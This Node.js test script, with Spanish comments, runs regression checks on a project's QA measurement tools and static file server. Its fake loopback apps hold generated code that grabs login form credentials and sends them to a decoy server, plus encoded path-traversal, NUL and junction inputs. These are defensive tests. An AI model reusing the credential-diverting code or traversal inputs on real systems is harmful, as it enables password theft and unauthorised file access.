// Fase 10A · V2: regresiones de las herramientas de 10A pedidas en la revisión V1 de Codex (F10A-01 a F10A-04). Solo Local.
//   node scripts/fase10a/probar-herramientas-10a.mjs --cuentas=<json QA> [--app-real=http://127.0.0.1:5401] [--salida=<archivo.json>]
//     [--sin-navegador]  omite los casos que necesitan Chromium (redirección y desvíos en ejecución)
//     [--filtro=<regex>] ejecuta solo los casos cuyo nombre coincide
//
// Del archivo de cuentas usa SOLO correos e ids (para que el preflight los encuentre en el Auth de Local). Las contraseñas se
// sustituyen por otras INVENTADAS en cada ejecución: ninguna contraseña real se escribe nunca en las apps falsas.
//   · F10A-01: las dos herramientas que inician sesión (medir-vitales-10a.cjs y verificar-roles-rutas.cjs) se ejecutan de verdad
//     contra apps FALSAS servidas en loopback y un servidor SEÑUELO que registra todo lo que recibe: app remota, backend ajeno en
//     el bundle, proxy del mismo origen, cuenta ajena, cuenta QA inexistente, login redirigido, desvío de credenciales al enviar el
//     formulario (a otro servidor y por proxy del mismo origen). En todos: código distinto de 0, la contraseña inventada no llega a
//     ningún servidor, ninguna escritura a la app y ninguna asistente provisionada. Control positivo: preflight de la app real.
//   · F10A-02: evaluador con carpeta vacía, productor que falla, carpeta reutilizada, archivo faltante o alterado, productor con
//     código distinto de 0, muestras vacías, escenario omitido, medición declarada incompleta, alcance parcial y ejecución sana.
//   · F10A-03: servidor estático con carpeta vecina de prefijo común, traversal codificado, junction hacia fuera, URI malformada
//     y NUL; controles de assets, HEAD, cabeceras de _headers y fallback de /ventas. También se reproduce el defecto en la V1.
//   · F10A-04: comparación exacta de CLS (0.1, 0.10001, 0.14, 0.149, 0.15, ausente) y mediana con número par de muestras.
// V3 (revisión V2 de Codex):
//   · F10A-01b: redirecciones EN EJECUCIÓN tras un login 200 (fetch, recurso y navegación; 302/303/307/308; otro puerto, externo
//     simulado y cadenas), CONNECT ajeno, redirección interna y throttling a través del proxy de guarda; y las dos herramientas
//     reales con un GET permitido que la app redirige al señuelo. Condición: CERO peticiones al señuelo.
//   · F10A-02b: muestras inválidas mixtas (null/texto/no finito), errores de página en vitales/iniciales/búsqueda/cupones,
//     manifiesto sin cierre, huella final nula, artefactos vacíos u omitidos, app de grupo no declarada, fuentes cambiadas,
//     formato V2 con varios grupos, y los fixtures de la revisión de Codex (copiados).
//   · F10A-03b: carpeta servida sustituida por una junction tras arrancar (con y sin índice en caché); reproducción en la V2.
import assert from 'node:assert/strict'
import { spawn, execFileSync } from 'node:child_process'
import { randomBytes, randomUUID, createHash } from 'node:crypto'
import { copyFileSync, mkdirSync, mkdtempSync, readFileSync, renameSync, rmSync, symlinkSync, unlinkSync, writeFileSync } from 'node:fs'
import http from 'node:http'
import { createRequire } from 'node:module'
import { tmpdir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { cumple, evaluarPresupuestos, formatear } from './lib/evaluar-presupuestos.mjs'

const require = createRequire(import.meta.url)
const G = require('./lib/guardas-local-10a.cjs')
const { mediana, validarMuestras } = require('./lib/estadistica.cjs')
const RAIZ = resolve(dirname(fileURLToPath(import.meta.url)), '..', '..')
const arg = (n, d) => process.argv.find((a) => a.startsWith(`--${n}=`))?.slice(n.length + 3) ?? d
const SALIDA = arg('salida'), APP_REAL = arg('app-real'), SIN_NAVEGADOR = process.argv.includes('--sin-navegador')
if (!arg('cuentas')) { console.error('uso: --cuentas=<json QA> [--app-real=<url>] [--salida=<archivo>] [--sin-navegador]'); process.exit(2) }
const reales = JSON.parse(readFileSync(arg('cuentas'), 'utf8'))
const CLAVE = `clave-inventada-${randomBytes(6).toString('hex')}` // la única «contraseña» que verán las apps falsas
const identidad = (k) => ({ email: reales[k].email, id: reales[k].id, password: CLAVE })
const TMP = mkdtempSync(join(tmpdir(), 'qa-f10a-herramientas-'))
const S = (f) => join(RAIZ, 'scripts', f)

const casos = []
const FILTRO = arg('filtro') && new RegExp(arg('filtro'))
async function caso(nombre, fn) {
  if (FILTRO && !FILTRO.test(nombre)) return
  const t0 = Date.now()
  try { const detalle = await fn(); casos.push({ nombre, ok: true, ms: Date.now() - t0, detalle }); console.log(`OK    ${nombre}`) } catch (e) {
    const d = String(e.message).split('\n').filter(Boolean).slice(0, 6).join(' | ').slice(0, 900)
    casos.push({ nombre, ok: false, ms: Date.now() - t0, error: d }); console.log(`FALLA ${nombre}\n      ${d}`)
  }
}

// ---------------- utilidades ----------------
/** Servidor HTTP en loopback que registra cada petición (método, ruta y cuerpo) y cada intento de WebSocket. */
function servidor(manejar) {
  return new Promise((ok) => {
    const peticiones = []
    const srv = http.createServer((req, res) => {
      let cuerpo = ''
      req.on('data', (c) => { cuerpo += c })
      req.on('end', () => { peticiones.push({ metodo: req.method, url: req.url, cuerpo }); manejar(req, res) })
    })
    srv.on('upgrade', (req, socket) => { peticiones.push({ metodo: 'UPGRADE', url: req.url, cuerpo: '' }); socket.destroy() })
    srv.listen(0, '127.0.0.1', () => ok({ puerto: srv.address().port, peticiones, cerrar: () => new Promise((r) => { srv.closeAllConnections?.(); srv.close(r) }) }))
  })
}
function correr(script, args, limiteMs = 600000) {
  return new Promise((ok) => {
    const p = spawn(process.execPath, [script, ...args], { cwd: RAIZ })
    let salida = ''
    p.stdout.on('data', (x) => { salida += x }); p.stderr.on('data', (x) => { salida += x })
    const t = setTimeout(() => { salida += '\n[prueba] TIEMPO AGOTADO'; p.kill() }, limiteMs)
    p.on('close', (codigo) => { clearTimeout(t); ok({ codigo, salida }) })
  })
}
const psql = (sql) => execFileSync('docker', ['exec', '-i', 'supabase_db_WedJaiseReact', 'psql', '-U', 'postgres', '-d', 'postgres', '-At'], { input: `begin read only; ${sql} rollback;`, encoding: 'utf8' }).split('\n').find((l) => /^\d/.test(l)).trim()
const asistentesTemporales = () => psql("select (select count(*) from auth.users where email like 'qa-f10a-asistente-%') || '|' || (select count(*) from usuarios where email like 'qa-f10a-asistente-%');")
const escribirJson = (nombre, datos) => { const f = join(TMP, nombre); writeFileSync(f, JSON.stringify(datos)); return f }
const sha256 = (b) => createHash('sha256').update(b).digest('hex')

// ---------------- app falsa ----------------
// Bundle mínimo con la MISMA forma compilada de src/lib/supabase.js (`X=`url`,Y=X.startsWith(`/`)?…`). `backend` decide qué URL
// declara; `desvio` qué hace el formulario al enviarse: nada, POST a otro servidor (+ WebSocket) o POST por proxy del mismo origen.
function bundleFalso({ backend, desvio, puertoSenuelo }) {
  const destino = desvio === 'senuelo' ? `'http://127.0.0.1:'+${puertoSenuelo}+'/token'` : `'/auth/v1/token'`
  // V3 (F10A-01b): GET PERMITIDO a la propia app con los campos en la query; la app responde con una redirección al señuelo.
  if (desvio === 'rebote' || desvio === 'cadena') {
    return `var u=\`${backend}\`,s=u.startsWith(\`/\`)?location.origin+u:u;window.__backend=s;
document.addEventListener('DOMContentLoaded',()=>{document.querySelector('form').addEventListener('submit',(e)=>{e.preventDefault();
const q='?clave='+encodeURIComponent(document.querySelector('#password').value)+'&email='+encodeURIComponent(document.querySelector('#email').value);
fetch('/assets/${desvio}'+q).catch(()=>{}).finally(()=>history.pushState({},'','/inicio'))})});`
  }
  return `var u=\`${backend}\`,s=u.startsWith(\`/\`)?location.origin+u:u;window.__backend=s;
document.addEventListener('DOMContentLoaded',()=>{const f=document.querySelector('form');f&&f.addEventListener('submit',(e)=>{e.preventDefault();
${desvio ? `const d=JSON.stringify({e:document.querySelector('#email').value,p:document.querySelector('#password').value});
fetch(${destino},{method:'POST',body:d}).catch(()=>{});
${desvio === 'senuelo' ? `try{new WebSocket('ws://127.0.0.1:'+${puertoSenuelo}+'/ws')}catch(x){}` : ''}` : ''}
setTimeout(()=>history.pushState({},'','/inicio'),400)})});`
}
const HTML_FALSO = '<!doctype html><html><head><meta charset="utf-8"><title>App falsa QA</title></head><body><form><input id="email"><input id="password" type="password"><button type="submit">Entrar</button></form><main>Contenido de prueba de una app falsa servida en loopback para QA</main><script type="module" src="/assets/index-falso.js"></script></body></html>'
async function appFalsa(opciones) {
  return servidor((req, res) => {
    const ruta = new URL(req.url, 'http://x').pathname
    if (opciones.redirigirLogin && ruta === '/login') { res.writeHead(302, { Location: `http://127.0.0.1:${opciones.puertoSenuelo}/login` }); return res.end() }
    const q = new URL(req.url, 'http://x').search
    if (ruta === '/assets/rebote') { res.writeHead(302, { Location: `http://127.0.0.1:${opciones.puertoSenuelo}/captura${q}` }); return res.end() }
    if (ruta === '/assets/cadena') { res.writeHead(303, { Location: `/assets/cadena-2${q}` }); return res.end() }
    if (ruta === '/assets/cadena-2') { res.writeHead(307, { Location: `http://127.0.0.1:${opciones.puertoSenuelo}/captura${q}` }); return res.end() }
    if (ruta === '/assets/index-falso.js') { res.writeHead(200, { 'Content-Type': 'application/javascript' }); return res.end(bundleFalso(opciones)) }
    if (ruta === '/sw.js' || req.method !== 'GET') { res.writeHead(404); return res.end() }
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }); res.end(HTML_FALSO)
  })
}
const senuelo = () => servidor((req, res) => {
  // Si alguna vez llega aquí, sirve un login propio que enviaría las credenciales a este mismo servidor.
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' })
  res.end('<!doctype html><form method="post" action="/token"><input id="email" name="e"><input id="password" name="p"><button type="submit">Entrar</button></form><main>Señuelo de QA con texto suficiente</main>')
})

// ======================= F10A-04 y estadística =======================
await caso('F10A-04: CLS se compara EXACTO: 0.1 cumple; 0.10001, 0.14, 0.149, 0.15, ausente, texto y NaN no', () => {
  assert.equal(cumple(0.1, 0.1), true)
  for (const v of [0.10001, 0.14, 0.149, 0.15, null, undefined, '0.05', Number.NaN]) assert.equal(cumple(v, 0.1), false, String(v))
  assert.equal(formatear(0.10043430171997483, 'portal-inicio frio · CLS'), '0.1004')
})
await caso('F10A-04: la evaluación de vitales usa la mediana EXACTA de las muestras, no el resumen redondeado', () => {
  const m = (cls) => ({ lcp: 1000, cls, interaccionMs: 50, errores: 0 })
  const P = JSON.parse(readFileSync(S('fase10a/presupuestos-rendimiento.json'), 'utf8'))
  const vit = { completo: true, escenarios: { 'portal-inicio': { frio: { cls: 0.1 }, caliente: { cls: 0.1 }, muestrasFrio: [m(0.1004), m(0.1004), m(0.1004)], muestrasCaliente: [m(0.1), m(0.09), m(0.1)] } }, reducido: {} }
  const { filas } = evaluarPresupuestos({ leer: () => vit, P, grupos: ['vitales'] })
  assert.equal(filas.find((f) => f.que === 'portal-inicio frio · CLS').ok, false, '0.1004 con resumen 0.1 no debe aprobar')
  assert.equal(filas.find((f) => f.que === 'portal-inicio caliente · CLS').ok, true)
})
await caso('Mediana: impar, PAR (media de las dos centrales), sin muestras válidas → null; --muestras validado', () => {
  assert.equal(mediana([3, 1, 2]), 2)
  assert.equal(mediana([4, 1, 3, 2]), 2.5)
  assert.equal(mediana([1, null, 'sin-campo', 3]), 2)
  assert.equal(mediana([]), null)
  assert.equal(mediana(['sin-campo']), null)
  for (const v of ['0', '-1', '2.5', 'x', '10']) assert.throws(() => validarMuestras(v))
  assert.equal(validarMuestras('4'), 4)
})

// ======================= F10A-02: evaluador =======================
const EVAL = S('fase10a/medir-rendimiento-10a.mjs')
const LEGADO = join(RAIZ, '.codex/evidencia-fase10a/rendimiento')
const ARCH = { cupones: 'cupones-reposo.json', busqueda: 'busqueda-amplia.json', iniciales: 'datos-iniciales.json', sesion: 'sesion-larga.json', vitales: 'vitales.json' }
// Ejecución SANA sintética: los datos reales de 10A con vitales que cumplen y un manifiesto con los hashes correctos.
function carpetaSana(nombre, { alcance = Object.keys(ARCH), retocar, retocarTras } = {}) {
  const dir = join(TMP, nombre); mkdirSync(dir, { recursive: true })
  for (const g of alcance) copyFileSync(join(LEGADO, ARCH[g]), join(dir, ARCH[g]))
  if (alcance.includes('vitales')) {
    const v = JSON.parse(readFileSync(join(dir, ARCH.vitales), 'utf8'))
    v.completo = true
    for (const e of Object.values(v.escenarios)) for (const k of ['muestrasFrio', 'muestrasCaliente']) e[k] = e[k].map((x) => ({ ...x, lcp: 1800, cls: 0.02, interaccionMs: typeof x.interaccionMs === 'number' ? 80 : x.interaccionMs }))
    writeFileSync(join(dir, ARCH.vitales), JSON.stringify(v))
  }
  retocar?.(dir)
  const productores = Object.fromEntries(alcance.map((g) => [g, { estado: 0, archivo: ARCH[g], escritoEnEstaEjecucion: true, sha256: sha256(readFileSync(join(dir, ARCH[g]))) }]))
  // Manifiesto V3: cierre, app por grupo, huellas iniciales/finales iguales y fuentes sin cambios.
  const appDe = { cupones: 'http://127.0.0.1:5402/PosJaise', busqueda: 'http://127.0.0.1:5173', iniciales: 'http://127.0.0.1:5401', sesion: 'http://127.0.0.1:5401', vitales: 'http://127.0.0.1:5403' }
  const apps = Object.fromEntries(alcance.map((g) => [g, [appDe[g]]]))
  const artefactos = Object.fromEntries([...new Set(alcance.map((g) => appDe[g]))].map((a) => [a, { inicio: 'a'.repeat(64), fin: 'a'.repeat(64) }]))
  const fuentes = { inicio: { sha256: 'b'.repeat(64), archivos: 1 }, fin: { sha256: 'b'.repeat(64), archivos: 1 } }
  writeFileSync(join(dir, 'ejecucion.json'), JSON.stringify({ id: randomUUID(), formato: 3, inicio: '2026-10-13T00:00:00Z', fin: '2026-10-13T00:10:00Z', alcance, global: alcance.length === 5, apps, fuentes, artefactos, productores }))
  retocarTras?.(dir) // después del manifiesto: simula lo que cambia o desaparece tras la ejecución
  return dir
}
const evaluar = (dir, extra = []) => correr(EVAL, ['--evaluar', `--salida=${dir}`, ...extra], 60000)
const veredicto = (r) => (r.salida.match(/VEREDICTO: (\S+)/) ?? [])[1]

await caso('F10A-02: carpeta sin mediciones → INCOMPLETA y código 1 (la V1 daba «0/0» con código 0)', async () => {
  const dir = join(TMP, 'vacia'); mkdirSync(dir)
  const r = await evaluar(dir)
  assert.equal(r.codigo, 1, r.salida.slice(-300)); assert.equal(veredicto(r), 'INCOMPLETA'); assert.match(r.salida, /sin manifiesto/)
})
await caso('F10A-02: el productor FALLA (archivo de cuentas inexistente) → FALLÓ, INCOMPLETA y código 1', async () => {
  const dir = join(TMP, 'productor-falla')
  const r = await correr(EVAL, ['--solo=vitales', `--cuentas=${join(TMP, 'no-existe.json')}`, `--salida=${dir}`], 120000)
  assert.equal(r.codigo, 1, r.salida.slice(-400)); assert.match(r.salida, /FALLÓ\s+vitales/); assert.equal(veredicto(r), 'INCOMPLETA')
  const m = JSON.parse(readFileSync(join(dir, 'ejecucion.json'), 'utf8'))
  assert.notEqual(m.productores.vitales.estado, 0)
  return { estadoProductor: m.productores.vitales.estado, problemas: r.salida.split('\n').filter((l) => l.startsWith('PROBLEMA')) }
})
await caso('F10A-02: medir en una carpeta con resultados anteriores se rechaza (código 2) y no los reutiliza', async () => {
  const dir = carpetaSana('reutilizada')
  const r = await correr(EVAL, ['--solo=vitales', `--cuentas=${join(TMP, 'no-existe.json')}`, `--salida=${dir}`], 60000)
  assert.equal(r.codigo, 2, r.salida.slice(-300)); assert.match(r.salida, /carpeta nueva o vacía/)
})
await caso('F10A-02: ejecución SANA completa (5 grupos, manifiesto y hashes correctos) → CUMPLE, alcance global y código 0', async () => {
  const r = await evaluar(carpetaSana('sana'))
  assert.equal(r.codigo, 0, r.salida.slice(-500)); assert.equal(veredicto(r), 'CUMPLE'); assert.match(r.salida, /219\/219 presupuestos cumplidos · 0 problemas · alcance global/)
})
for (const [nombre, retocar, patron, tras] of [
  ['archivo faltante', (d) => unlinkSync(join(d, ARCH.sesion)), /sesion: falta sesion-larga\.json/, true],
  ['muestras vacías', (d) => { const f = join(d, ARCH.vitales); const v = JSON.parse(readFileSync(f, 'utf8')); v.escenarios['pos-ventas'].muestrasFrio = []; writeFileSync(f, JSON.stringify(v)) }, /«pos-ventas frio» con 0 muestras válidas de 0/],
  ['escenario omitido', (d) => { const f = join(d, ARCH.vitales); const v = JSON.parse(readFileSync(f, 'utf8')); delete v.escenarios['pos-pedidos-web']; writeFileSync(f, JSON.stringify(v)) }, /falta el resultado esperado «pos-pedidos-web»/],
  ['medición declarada incompleta', (d) => { const f = join(d, ARCH.vitales); const v = JSON.parse(readFileSync(f, 'utf8')); v.completo = false; v.errores = ['corte simulado']; writeFileSync(f, JSON.stringify(v)) }, /declaró la medición incompleta/],
  ['resultado de iniciales omitido', (d) => { const f = join(d, ARCH.iniciales); const v = JSON.parse(readFileSync(f, 'utf8')); delete v.resultados['inicio-visitante']; writeFileSync(f, JSON.stringify(v)) }, /falta el resultado esperado «inicio-visitante»/],
]) {
  await caso(`F10A-02: ${nombre} → INCOMPLETA y código 1 aunque las filas presentes cumplan`, async () => {
    // Los retoques de contenido van ANTES del manifiesto (hashes coherentes: solo se detecta el problema de contenido); el archivo
    // faltante desaparece DESPUÉS de la ejecución.
    const r = await evaluar(carpetaSana(nombre.replace(/\s+/g, '-'), tras ? { retocarTras: retocar } : { retocar }))
    assert.equal(r.codigo, 1, r.salida.slice(-400)); assert.equal(veredicto(r), 'INCOMPLETA'); assert.match(r.salida, patron)
  })
}
await caso('F10A-02: un archivo ALTERADO tras la ejecución (resultado antiguo o ajeno) no coincide con el manifiesto → código 1', async () => {
  const dir = carpetaSana('alterado')
  const f = join(dir, ARCH.cupones); const v = JSON.parse(readFileSync(f, 'utf8')); v.fecha = '2020-01-01T00:00:00Z'; writeFileSync(f, JSON.stringify(v))
  const r = await evaluar(dir)
  assert.equal(r.codigo, 1); assert.match(r.salida, /cupones: cupones-reposo\.json no coincide con el registrado/)
})
await caso('F10A-02: un productor con código distinto de 0 en el manifiesto → código 1 aunque su archivo cumpla', async () => {
  const dir = carpetaSana('productor-no-cero')
  const m = JSON.parse(readFileSync(join(dir, 'ejecucion.json'), 'utf8')); m.productores.busqueda.estado = 1; writeFileSync(join(dir, 'ejecucion.json'), JSON.stringify(m))
  const r = await evaluar(dir)
  assert.equal(r.codigo, 1); assert.match(r.salida, /busqueda: el medidor terminó con código 1/)
})
await caso('F10A-02: --solo evalúa un alcance menor y lo declara PARCIAL (no es el cierre global)', async () => {
  const r = await evaluar(carpetaSana('parcial', { alcance: ['vitales'] }), ['--solo=vitales'])
  assert.equal(r.codigo, 0, r.salida.slice(-300)); assert.match(r.salida, /alcance PARCIAL/)
  const r2 = await evaluar(carpetaSana('parcial-2', { alcance: ['vitales'] }))
  assert.equal(r2.codigo, 1, 'sin --solo, una ejecución parcial no puede presentarse como global'); assert.match(r2.salida, /no forma parte de la ejecución/)
})
// ---- V3 (F10A-02b): muestras inválidas, errores de página y manifiestos sin cierre o sin artefactos ----
const retocarJson = (archivo, fn) => (d) => { const f = join(d, archivo); const v = JSON.parse(readFileSync(f, 'utf8')); fn(v); writeFileSync(f, JSON.stringify(v)) }
const retocarManifiesto = (fn) => (d) => { const f = join(d, 'ejecucion.json'); const m = JSON.parse(readFileSync(f, 'utf8')); fn(m); writeFileSync(f, JSON.stringify(m)) }
const NO_VALIDOS = [null, 'sin-campo', Number.NaN, '1800']
for (const [nombre, opciones, patron] of [
  // contenido (antes del manifiesto: hashes coherentes)
  ['vitales con 3 registros pero solo 1 válido (null, texto, no finito) en LCP/CLS/interacción', { retocar: retocarJson(ARCH.vitales, (v) => { for (const e of Object.values(v.escenarios)) for (const k of ['muestrasFrio', 'muestrasCaliente']) e[k] = e[k].map((x, i) => (i === 0 ? x : { ...x, lcp: NO_VALIDOS[i % 4], cls: NO_VALIDOS[(i + 1) % 4], interaccionMs: NO_VALIDOS[(i + 2) % 4] })) }) }, /«pos-ventas frio» con 1 muestras válidas de 3/],
  ['vitales con UNA sola métrica inválida en una muestra (CLS null)', { retocar: retocarJson(ARCH.vitales, (v) => { v.escenarios['portal-inicio'].muestrasCaliente[2].cls = null }) }, /«portal-inicio caliente» con 2 muestras válidas de 3/],
  ['vitales con errores de página en todas las muestras', { retocar: retocarJson(ARCH.vitales, (v) => { for (const e of Object.values(v.escenarios)) for (const k of ['muestrasFrio', 'muestrasCaliente']) for (const x of e[k]) x.errores = 3 }) }, /con 0 muestras válidas de 3/],
  ['iniciales con un error de página en una muestra', { retocar: retocarJson(ARCH.iniciales, (v) => { v.resultados['pedidos-web'].muestras[1].erroresPagina = ['TypeError simulado'] }) }, /iniciales: «pedidos-web» con 2 muestras válidas de 3/],
  ['iniciales con una métrica no numérica en una muestra (la mediana resumida seguía cumpliendo)', { retocar: retocarJson(ARCH.iniciales, (v) => { v.resultados['promociones'].muestras[0].nodos = 'sin-campo' }) }, /iniciales: «promociones» con 2 muestras válidas de 3/],
  ['búsqueda con un error de página en una muestra cruda', { retocar: retocarJson(ARCH.busqueda, (v) => { v.crudas.find((c) => c.ruta === 'servicios' && c.ancho === 412).errores = ['TypeError simulado'] }) }, /busqueda: «servicios 412px» con 2 muestras válidas de 3/],
  ['cupones con errores de página en una ruta', { retocar: retocarJson(ARCH.cupones, (v) => { v.resultados[0].errores = ['TypeError simulado'] }) }, /cupones: «\/promociones oscuro» con errores de página/],
  // manifiesto (después de escribirlo)
  ['manifiesto SIN cierre («fin» ausente: ejecución interrumpida)', { retocarTras: retocarManifiesto((m) => { delete m.fin }) }, /no registró su cierre/],
  ['huella FINAL nula de un artefacto (la app no respondió al terminar)', { retocarTras: retocarManifiesto((m) => { m.artefactos['http://127.0.0.1:5401'].fin = null }) }, /artefacto http:\/\/127\.0\.0\.1:5401: sin huella final/],
  ['manifiesto con artefactos vacíos', { retocarTras: retocarManifiesto((m) => { m.artefactos = {} }) }, /no registrado en el manifiesto/],
  ['manifiesto sin la entrada «artefactos»', { retocarTras: retocarManifiesto((m) => { delete m.artefactos }) }, /no registrado en el manifiesto/],
  ['manifiesto que no declara la app de un grupo', { retocarTras: retocarManifiesto((m) => { delete m.apps.busqueda }) }, /busqueda: el manifiesto no declara qué app midió/],
  ['fuentes del candidato cambiadas durante la ejecución', { retocarTras: retocarManifiesto((m) => { m.fuentes.fin.sha256 = 'c'.repeat(64) }) }, /fuentes del candidato .* cambiaron/],
  ['manifiesto de formato V2 (sin «apps») con varios grupos', { retocarTras: retocarManifiesto((m) => { delete m.apps; delete m.fuentes; delete m.formato }) }, /formato V2\) con más de un grupo/],
]) {
  await caso(`F10A-02b: ${nombre} → INCOMPLETA y código 1`, async () => {
    const r = await evaluar(carpetaSana(`v3-${randomBytes(3).toString('hex')}`, opciones))
    assert.equal(r.codigo, 1, r.salida.slice(-500)); assert.equal(veredicto(r), 'INCOMPLETA', r.salida.slice(-500)); assert.match(r.salida, patron, r.salida.slice(-800))
    return { problemas: r.salida.split('\n').filter((l) => l.startsWith('PROBLEMA')).slice(0, 4) }
  })
}
// Los fixtures de la revisión V2 de Codex, COPIADOS (la evaluación escribe en la carpeta y su evidencia no se toca).
const FIXTURES_CODEX = join(RAIZ, '.codex/evidencia-revision-fase10a-v2')
await caso('F10A-02b: fixtures de Codex reevaluados — control-sano CUMPLE (formato V2 de un grupo); muestras mixtas, pageerror, sin huella final y sin artefactos → INCOMPLETA', async () => {
  const res = {}
  for (const nombre of ['control-sano', 'muestras-invalidas-mixtas', 'muestras-con-pageerror', 'sin-huella-final', 'sin-artefactos']) {
    const dir = join(TMP, `codex-${nombre}`); mkdirSync(dir)
    for (const f of ['ejecucion.json', 'vitales.json']) copyFileSync(join(FIXTURES_CODEX, nombre, f), join(dir, f))
    const r = await evaluar(dir, ['--solo=vitales'])
    res[nombre] = { codigo: r.codigo, veredicto: veredicto(r), problemas: r.salida.split('\n').filter((l) => l.startsWith('PROBLEMA')).length }
  }
  assert.deepEqual(res['control-sano'], { codigo: 0, veredicto: 'CUMPLE', problemas: 0 }, JSON.stringify(res))
  for (const n of ['muestras-invalidas-mixtas', 'muestras-con-pageerror', 'sin-huella-final', 'sin-artefactos']) { assert.equal(res[n].codigo, 1, n); assert.equal(res[n].veredicto, 'INCOMPLETA', n) }
  return res
})
await caso('F10A-02/04: la evidencia V1 reevaluada da 18/219 incumplimientos y queda INCOMPLETA por no tener manifiesto', async () => {
  const dir = join(TMP, 'legado-v1'); mkdirSync(dir)
  for (const f of Object.values(ARCH)) copyFileSync(join(LEGADO, f), join(dir, f))
  const r = await evaluar(dir)
  assert.equal(r.codigo, 1); assert.match(r.salida, /201\/219 presupuestos cumplidos/); assert.equal(veredicto(r), 'INCOMPLETA')
  return { incumplimientos: r.salida.split('\n').filter((l) => l.startsWith('NO CUMPLE')).length }
})

// ======================= F10A-03: servidor estático =======================
async function probarServidor(script, etiqueta) {
  const base = join(TMP, `srv-${etiqueta}`)
  const raiz = join(base, 'servidor-fixture'), vecina = join(base, 'servidor-fixture-ajeno'), fuera = join(base, 'fuera')
  for (const d of [join(raiz, 'assets'), vecina, fuera]) mkdirSync(d, { recursive: true })
  writeFileSync(join(raiz, 'index.html'), '<!doctype html><title>indice QA</title>')
  writeFileSync(join(raiz, 'assets', 'app-qa.js'), 'console.log("asset QA")')
  writeFileSync(join(raiz, '_headers'), '/assets/*\n  Cache-Control: public, max-age=31536000, immutable\n')
  const MARCA = `MARCA-VECINA-${randomBytes(4).toString('hex')}`
  writeFileSync(join(vecina, 'marca.txt'), MARCA); writeFileSync(join(fuera, 'marca.txt'), MARCA)
  let enlace = false
  try { symlinkSync(fuera, join(raiz, 'enlace'), 'junction'); enlace = true } catch {}
  const puerto = 20000 + Math.floor(Math.random() * 20000)
  const p = spawn(process.execPath, [script, raiz, String(puerto)], { cwd: RAIZ })
  await new Promise((ok, mal) => { let o = ''; p.stdout.on('data', (x) => { o += x; if (o.includes('servir-como-pages')) ok() }); setTimeout(() => mal(new Error('el servidor no arrancó')), 8000) })
  // http.request con la ruta CRUDA (fetch/URL normalizarían %2e%2e antes de enviarla).
  const pedir = (ruta, metodo = 'GET') => new Promise((ok) => {
    const q = http.request({ host: '127.0.0.1', port: puerto, path: ruta, method: metodo }, (res) => { let c = ''; res.on('data', (x) => { c += x }); res.on('end', () => ok({ estado: res.statusCode, cuerpo: c, cab: res.headers })) })
    q.on('error', (e) => ok({ estado: 0, cuerpo: String(e.message), cab: {} })); q.end()
  })
  const r = {}
  for (const [k, ruta] of Object.entries({ prefijo: '/..%2fservidor-fixture-ajeno%2fmarca.txt', puntos: '/%2e%2e/servidor-fixture-ajeno/marca.txt', barraInvertida: '/..%5cservidor-fixture-ajeno%5cmarca.txt', enlaceArchivo: '/enlace/marca.txt', enlaceDir: '/enlace/', malformada: '/%E0%A4%A', nul: '/assets%00/app-qa.js', asset: '/assets/app-qa.js', ventas: '/ventas', raiz: '/' })) r[k] = await pedir(ruta)
  r.head = await pedir('/assets/app-qa.js', 'HEAD')
  p.kill()
  return { r, MARCA, enlace }
}
await caso('F10A-03: servidor V2 — prefijo vecino, traversal codificado, junction, URI malformada y NUL no salen de la carpeta; assets, HEAD, _headers y fallback intactos', async () => {
  const { r, MARCA, enlace } = await probarServidor(S('fase10a/servir-como-pages.cjs'), 'v2')
  for (const k of ['prefijo', 'puntos', 'barraInvertida', 'enlaceArchivo', 'enlaceDir', 'malformada', 'nul']) assert.ok(!r[k].cuerpo.includes(MARCA), `${k} devolvió la marca de fuera`)
  assert.equal(r.prefijo.estado, 400); assert.equal(r.barraInvertida.estado, 400); assert.equal(r.malformada.estado, 400); assert.equal(r.nul.estado, 400)
  if (enlace) { assert.equal(r.enlaceArchivo.estado, 403); assert.equal(r.enlaceDir.estado, 403) }
  assert.equal(r.asset.estado, 200); assert.match(r.asset.cuerpo, /asset QA/); assert.match(r.asset.cab['cache-control'], /immutable/)
  assert.equal(r.head.estado, 200); assert.equal(r.head.cuerpo, '')
  for (const k of ['ventas', 'raiz', 'puntos']) { assert.equal(r[k].estado, 200, k); assert.match(r[k].cuerpo, /indice QA/, k) }
  return { estados: Object.fromEntries(Object.entries(r).map(([k, v]) => [k, v.estado])), junctionProbada: enlace }
})
// V3 (F10A-03b): la carpeta servida se sustituye por una junction a otra carpeta DESPUÉS de arrancar. Ni la ruta directa ni el
// fallback de SPA pueden devolver el índice ajeno. `script` permite reproducir el defecto con la copia V2.
async function probarFallbackTrasArranque(script, etiqueta, { conAntes = true } = {}) {
  const base = join(TMP, `fallback-${etiqueta}`)
  const raiz = join(base, 'servida'), ajena = join(base, 'ajena'), apartada = join(base, 'servida-original')
  for (const d of [join(raiz, 'assets'), ajena]) mkdirSync(d, { recursive: true })
  const MARCA = `INDICE-AJENO-${randomBytes(4).toString('hex')}`
  writeFileSync(join(raiz, 'index.html'), '<!doctype html><title>indice propio QA</title>')
  writeFileSync(join(raiz, 'assets', 'app-qa.js'), 'console.log("asset QA")')
  writeFileSync(join(ajena, 'index.html'), `<!doctype html><title>${MARCA}</title>`)
  const puerto = 20000 + Math.floor(Math.random() * 20000)
  const p = spawn(process.execPath, [script, raiz, String(puerto)], { cwd: RAIZ })
  await new Promise((ok, mal) => { let o = ''; p.stdout.on('data', (x) => { o += x; if (o.includes('servir-como-pages')) ok() }); setTimeout(() => mal(new Error('el servidor no arrancó')), 8000) })
  const pedir = async (ruta) => { try { const r = await fetch(`http://127.0.0.1:${puerto}${ruta}`); return { estado: r.status, ajeno: (await r.text()).includes(MARCA) } } catch (e) { return { estado: 0, ajeno: false, error: e.message } } }
  try {
    // conAntes: pedir antes del cambio (el índice propio queda en la caché del servidor); sin ello, como en la reproducción de Codex.
    const antes = conAntes ? { ventas: await pedir('/ventas'), raiz: await pedir('/'), asset: await pedir('/assets/app-qa.js') } : null
    renameSync(raiz, apartada)
    symlinkSync(ajena, raiz, 'junction')
    const despues = { ventas: await pedir('/ventas'), indice: await pedir('/index.html'), raiz: await pedir('/'), anidada: await pedir('/clientes/123') }
    return { antes, despues, MARCA }
  } finally {
    p.kill()
    try { unlinkSync(raiz) } catch { try { rmSync(raiz, { recursive: false }) } catch {} }
  }
}
